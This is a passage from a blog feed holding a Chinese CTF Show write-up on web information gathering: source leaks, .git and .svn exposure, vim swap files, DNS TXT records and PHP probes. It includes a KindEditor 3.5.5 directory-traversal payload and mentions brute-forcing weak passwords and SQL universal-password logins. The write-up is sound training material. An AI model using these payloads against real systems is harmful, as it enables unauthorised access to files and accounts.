    <summary type="html">&lt;p&gt;如果你的至亲犯了罪，杀了人，在你童年一无所知的时候，对你造成了难以想象的伤害，你该如何活下去？&lt;br&gt;你能相信一个人这一辈子只为一个人而活着吗？每天就仅仅是做着相同的事情，他是一个合格的丈夫，合格的父亲，可他的过去是自己可以选择的吗？&lt;br&gt;如果曝光，世人会怎末说，连环杀人</summary>
      
    
    
    
    <category term="影视有感" scheme="https://xizhi-future.github.io/categories/%E5%BD%B1%E8%A7%86%E6%9C%89%E6%84%9F/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF Show---信息搜集</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2021-10-01T09:20:33.000Z</published>
    <updated>2021-10-07T10:15:22.285Z</updated>
    
    <content type="html"><![CDATA[<p>CTF Show 中 web入门，信息搜集篇。</p><span id="more"></span><h1 id="一、CTF-Show-—-信息搜集"><a href="#一、CTF-Show-—-信息搜集" class="headerlink" title="一、CTF Show — 信息搜集"></a>一、CTF Show — 信息搜集</h1><h2 id="1-1-Web1-—-查看源代码"><a href="#1-1-Web1-—-查看源代码" class="headerlink" title="1.1 Web1 — 查看源代码"></a>1.1 Web1 — 查看源代码</h2><p>直接查看源代码</p><p><img src="https://i.loli.net/2021/07/14/QcVRY3rX9a4USMZ.png" alt="image-20210714105835548"></p><h2 id="1-2-Web-2-—-查看源代码"><a href="#1-2-Web-2-—-查看源代码" class="headerlink" title="1.2 Web 2 — 查看源代码"></a>1.2 Web 2 — 查看源代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js前台拦截 === 无效操作</span><br></pre></td></tr></table></figure><p><strong>查看源代码的几种方式</strong></p><ul><li>右键查看源代码</li><li>F12 打开开发者工具</li><li>Ctrl + U 查看源代码</li><li>Burp 抓包查看</li></ul><h2 id="1-3-Web-3-—-抓包"><a href="#1-3-Web-3-—-抓包" class="headerlink" title="1.3 Web 3 — 抓包"></a>1.3 Web 3 — 抓包</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没思路的时候抓个包看看，可能会有意外收获</span><br></pre></td></tr></table></figure><p>抓包 尝试</p><p><img src="https://i.loli.net/2021/07/14/kOtL1lBa8b53pIS.png" alt="image-20210714111126154"></p><h2 id="1-4-Web-4-—-robots-txt-泄露"><a href="#1-4-Web-4-—-robots-txt-泄露" class="headerlink" title="1.4 Web 4 — robots.txt 泄露"></a>1.4 Web 4 — robots.txt 泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">总有人把后台地址写入robots，帮黑阔大佬们引路。</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/1t2zsvMoAJTPO3V.png" alt="image-20210714111325675"></p><p><img src="https://i.loli.net/2021/07/14/npvowT7mgbIzx2C.png" alt="image-20210714111358421"></p><h2 id="1-5-Web-5-—-phps-文件"><a href="#1-5-Web-5-—-phps-文件" class="headerlink" title="1.5 Web 5 — phps 文件"></a>1.5 Web 5 — phps 文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phps源码泄露有时候能帮上忙</span><br></pre></td></tr></table></figure><blockquote><p> <strong>phps文件</strong></p><p> ​    就是php的 <strong>源代码文件</strong>，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</p><p> ​    它的MIME类型为：text/html, application/x-httpd-php-source, application/x-httpd-php3-source。</p></blockquote><p><img src="https://i.loli.net/2021/07/14/m2Mex6SziNTg7EW.png" alt="image-20210714111652581"></p><p><img src="https://i.loli.net/2021/07/14/wRkJOuGiavhnM7N.png" alt="image-20210714111806962"></p><h2 id="1-6-Web-6-—-www-zip-泄露"><a href="#1-6-Web-6-—-www-zip-泄露" class="headerlink" title="1.6 Web 6 — www.zip 泄露"></a>1.6 Web 6 — <a href="http://www.zip/">www.zip</a> 泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解压源码到当前目录，测试正常，收工</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/9NrWGukdyw5EVMX.png" alt="image-20210714111959516"></p><p><img src="https://i.loli.net/2021/07/14/uZqlnDYc3SFaAMC.png" alt="image-20210714113312486"></p><p><img src="https://i.loli.net/2021/07/14/xWMmasCKAd91Pfq.png" alt="image-20210714113251749"></p><h2 id="1-7-Web-7-—-版本控制-git"><a href="#1-7-Web-7-—-版本控制-git" class="headerlink" title="1.7 Web 7 — 版本控制 .git"></a>1.7 Web 7 — 版本控制 <code>.git</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/mWX7dRU4ntLrFZs.png" alt="image-20210714150846912"></p><h2 id="1-8-Web-8-—-版本控制-svn"><a href="#1-8-Web-8-—-版本控制-svn" class="headerlink" title="1.8 Web 8 — 版本控制 .svn"></a>1.8 Web 8 — 版本控制 <code>.svn</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/DZMXJGrz7fAC9ju.png" alt="image-20210714152837039"></p><h2 id="1-9-Web-9-—-vim-临时文件缓存"><a href="#1-9-Web-9-—-vim-临时文件缓存" class="headerlink" title="1.9 Web 9 — vim 临时文件缓存"></a>1.9 Web 9 — vim 临时文件缓存</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</span><br></pre></td></tr></table></figure><p><strong>Vim 缓存</strong></p><blockquote><p>​    <strong>临时文件</strong> 是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动</p><p>删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可</p><p>以通过缓存文件恢复原始文件内容</p><p>​    <strong>以 index.php 为例</strong> </p><ol><li><p>第一次产生的缓存文件名为 <code>.index.php.swp</code></p></li><li><p>第二次意外退出后，文件名为 <code>.index.php.swo</code></p></li><li><p>第三次产生的缓存文件则为 <code>.index.php.swn</code></p></li></ol></blockquote><p><img src="https://i.loli.net/2021/07/14/AJUYaWD9ImPz7bF.png" alt="image-20210714153426274"></p><h2 id="1-10-Web-10-—-cookie-泄露"><a href="#1-10-Web-10-—-cookie-泄露" class="headerlink" title="1.10 Web 10 — cookie 泄露"></a>1.10 Web 10 — cookie 泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie 只是一块饼干，不能存放任何隐私数据</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/3R6u9WMdatXgSOv.png" alt="image-20210714154500245"></p><h2 id="1-11-Web-11-—-域名解析查询"><a href="#1-11-Web-11-—-域名解析查询" class="headerlink" title="1.11 Web 11 — 域名解析查询"></a>1.11 Web 11 — 域名解析查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</span><br></pre></td></tr></table></figure><p><strong>查看域名解析</strong></p><ul><li><p><code>nslookup</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt=txt ctfshow.com</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#nslookup 查询#直接域名查询nslookup domain#查询记录nslookup -qt = type domain [dns-server]type:    A --&gt;地址记录    AAAA   --&gt;地址记录    AFSDB Andrew    --&gt;文件系统数据库服务器记录    ATMA --&gt;ATM地址记录    CNAME  --&gt;别名记录    HINHO  --&gt;硬件配置记录，包括CPU、操作系统信息     ISDN   --&gt;域名对应的ISDN号码    MB   --&gt;存放指定邮箱的服务器    MG    --&gt;邮件组记录    MINFO   --&gt;邮件组和邮箱的信息记录    MR   --&gt;改名的邮箱记录    MX   --&gt;邮件服务器记录    NS --&gt; 名字服务器记录    PTR    --&gt;反向记录    RP   --&gt;负责人记录    RT  --&gt;路由穿透记录    SRV    --&gt;TCP服务器信息记录    TXT   --&gt;域名对应的文本信息    X25  --&gt;域名对应的X.25地址记录</span></span><br></pre></td></tr></table></figure></li><li><p>在线历史解析记录查询</p><p><img src="https://i.loli.net/2021/07/14/knpAHlIUJx7zyYK.png" alt="image-20210714155814946"></p></li><li><p>阿里云 DNS 检测</p><p><a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a></p><p><img src="https://i.loli.net/2021/07/14/yef6FBRPSJTgoKw.png" alt="image-20210714170535242"></p></li></ul><h2 id="1-12-Web-12-—-网站公开信息"><a href="#1-12-Web-12-—-网站公开信息" class="headerlink" title="1.12 Web 12 — 网站公开信息"></a>1.12 Web 12 — 网站公开信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有时候网站上的公开信息，就是管理员常用密码</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/hjlGXmsgyWSYrwf.png" alt="image-20210714171715223"></p><p><img src="https://i.loli.net/2021/07/14/eqwKlZuvLd2PJX8.png" alt="image-20210714171804528"></p><h2 id="1-13-Web-13-—-网站技术文档"><a href="#1-13-Web-13-—-网站技术文档" class="headerlink" title="1.13 Web 13 — 网站技术文档"></a>1.13 Web 13 — 网站技术文档</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/R2degLa3pzZKuni.png" alt="image-20210714172026755"></p><p><img src="https://i.loli.net/2021/07/14/lcYNRWCgMmvZaPw.png" alt="image-20210714172038292"></p><p><img src="https://i.loli.net/2021/07/14/lcpfsX1RWYOA3zP.png" alt="image-20210714172215536"></p><h2 id="1-14-Web-14-—-KindEditor-3-5-5-遍历目录漏洞（编辑器漏洞）"><a href="#1-14-Web-14-—-KindEditor-3-5-5-遍历目录漏洞（编辑器漏洞）" class="headerlink" title="1.14 Web 14 — KindEditor 3.5.5 遍历目录漏洞（编辑器漏洞）"></a>1.14 Web 14 — KindEditor 3.5.5 遍历目录漏洞（编辑器漏洞）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人2. 小0day:某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录</span><br></pre></td></tr></table></figure><p><strong>KindEditor 3.5.5 遍历目录漏洞</strong>        <a href="http://www.nxadmin.com/web/96.html">http://www.nxadmin.com/web/96.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload/url/editor/php/file_manager_json.php?path=/#可爆出根目录下所有文件/url/editor/php/file_manager_json.php?path=/var/www/html/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/15/27sLANSvX83kgRw.png" alt="image-20210715100641820"></p><p><img src="https://i.loli.net/2021/07/15/y9mVSprWKqZFPGT.png" alt="image-20210715100746950"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/url/editor/php/file_manager_json.php?path=/var/www/html/nothinghere/</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/15/rF2dO9o3JD8cVCx.png" alt="image-20210715100941439"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/url/nothinghere/fl000g.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/15/xPqTEnG4DrLtIwy.png" alt="image-20210715101127445"></p><p>拓展：<a href="https://blog.csdn.net/u011781521/article/details/59057759/">编辑器漏洞</a></p><h2 id="1-15-Web-15-—-前端邮箱信息泄露"><a href="#1-15-Web-15-—-前端邮箱信息泄露" class="headerlink" title="1.15 Web 15 — 前端邮箱信息泄露"></a>1.15 Web 15 — 前端邮箱信息泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">公开的信息比如邮箱，可能造成信息泄露，产生严重后果</span><br></pre></td></tr></table></figure><p>前端页面当中找到邮箱信息</p><p><img src="https://i.loli.net/2021/07/14/NqisDzZkouH2Oyb.png" alt="image-20210714173643444"></p><p><img src="https://i.loli.net/2021/07/14/Gzt8XqyCpu5drMk.png" alt="image-20210714173940662"></p><p>忘记密码 密保答案 西安 </p><p>成功重置密码</p><p>成功登录 拿到 flag</p><h2 id="1-16-Web-16-—-探针信息"><a href="#1-16-Web-16-—-探针信息" class="headerlink" title="1.16 Web 16 — 探针信息"></a>1.16 Web 16 — 探针信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</span><br></pre></td></tr></table></figure><p><strong>PHP 探针</strong></p><blockquote><p>​    <strong>php探针</strong> 是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%A1%AC%E7%9B%98/486482">服务器硬盘</a>资源、内存占用、网卡流量、系统负载、服务器时间等信息。</p></blockquote><p><a href="https://www.laozuo.org/16305.html">常用4款PHP探针</a></p><p>应该是雅黑探针，访问 <code>/tz.php</code></p><p><img src="https://i.loli.net/2021/07/14/Yb2xc5XQIrMFopy.png" alt="image-20210714213514783"></p><p>查找 <code>ctfshow</code> 即可</p><h2 id="1-17-Web-17-—-绕过-CDN-查-IP"><a href="#1-17-Web-17-—-绕过-CDN-查-IP" class="headerlink" title="1.17 Web 17 — 绕过 CDN 查 IP"></a>1.17 Web 17 — 绕过 CDN 查 IP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">透过重重缓存，查找到ctfer.com的真实IP，提交 flag&#123;IP地址&#125; </span><br></pre></td></tr></table></figure><p>全球 ping 可知：无 CDN </p><p>查 <code>www.ctfshow.com</code> 的 IP，即为 ctfer.com的真实IP</p><h2 id="1-18-Web-18-—-前端-js-泄露"><a href="#1-18-Web-18-—-前端-js-泄露" class="headerlink" title="1.18 Web 18 — 前端 js 泄露"></a>1.18 Web 18 — 前端 js 泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不要着急，休息，休息一会儿，玩101分给你flag</span><br></pre></td></tr></table></figure><p>查看源码，发现 <code>Flappy_js.j</code></p><p><img src="https://i.loli.net/2021/07/14/JzW2SpRsToZ91FA.png" alt="image-20210714180947784"></p><p>unicode 解码</p><p><img src="https://i.loli.net/2021/07/14/8H1RKnwdOsVSoY6.png" alt="image-20210714181055283"></p><p>访问 <code>110.php</code></p><p><img src="https://i.loli.net/2021/10/01/GP8DOvbLRjIf4yC.png" alt="image-20210714181154250"></p><h2 id="1-19-Web-19-—-前端密钥泄露"><a href="#1-19-Web-19-—-前端密钥泄露" class="headerlink" title="1.19 Web 19 — 前端密钥泄露"></a>1.19 Web 19 — 前端密钥泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密钥什么的，就不要放在前端了</span><br></pre></td></tr></table></figure><p>查看源码得到</p><p><img src="https://i.loli.net/2021/10/01/Wah8ZeLOXHFm1lw.png" alt="image-20210714181430721"></p><p>会有函数对我们提交的内容进行加密处理，处理后结果如果是下面绿色部分就显示flag，我们完全可以抓包直接将其修改为正确的样子</p><p><img src="https://i.loli.net/2021/07/14/xOsDeocflHvaiu6.png" alt="image-20210714181906722"></p><h2 id="1-20-Web-20-—-早期-asp-access-db-db-mdb-文件泄露"><a href="#1-20-Web-20-—-早期-asp-access-db-db-mdb-文件泄露" class="headerlink" title="1.20 Web 20 — 早期 asp+access /db/db.mdb 文件泄露"></a>1.20 Web 20 — 早期 asp+access <code>/db/db.mdb</code> 文件泄露</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/14/iFHty9PwMOAcWQb.png" alt="image-20210714182153060"></p><h2 id="1-21-Web-382-—"><a href="#1-21-Web-382-—" class="headerlink" title="1.21 Web 382 —"></a>1.21 Web 382 —</h2><p>首先查看源代码</p><p><img src="https://i.loli.net/2021/08/03/J71pYxy4QUmt2eM.png" alt="image-20210803095937572"></p><p>可以一一进行尝试，最后发现 <code>http://url/alsckdfy/</code> 竟然是网站的后台登录页面    </p><ul><li>爆破 弱密码</li><li>sql 万能密码</li></ul><p>成功登录之后即可获得 flag</p><h1 id="二、做题总结"><a href="#二、做题总结" class="headerlink" title="二、做题总结"></a>二、做题总结</h1><ul><li><p>第一步：查看 <strong>源代码</strong></p><ul><li>右键查看源代码</li><li>F12 打开开发者工具</li><li>Ctrl + U 查看源代码</li><li>Burp 抓包查看</li></ul></li><li><p><strong>抓包</strong> 可能发现一些有用信息</p></li><li><p><strong>robots.txt</strong> </p></li><li><p><strong>phps</strong> 源代码泄露</p></li><li><p>下载源码文件、网站备份文件</p></li><li><p>版本控制不要部署到生产环境中 <code>.git  .svn</code></p></li><li><p><strong>Vim 缓存</strong>    <code>.文件名.php.swp  .文件名.php.swo  .文件名.php.swn</code></p></li><li><p>cookie 的重要性</p></li><li><p>域名、子域名 信息搜集    <code>nslookup   在线网站</code></p></li><li><p>Banner 等公开信息   <code>管理员密码  QQ  QQ邮箱等  第三方软件查个人信息</code></p></li><li><p>技术文档</p></li><li><p>对应编辑器漏洞</p></li><li><p>探针</p></li><li><p>前端源码 密钥泄露</p></li><li><p><strong>db.mdb</strong></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF Show 中 web入门，信息搜集篇。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
    <category term="信息搜集" scheme="https://xizhi-future.github.io/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
  </entry>
  
</feed>
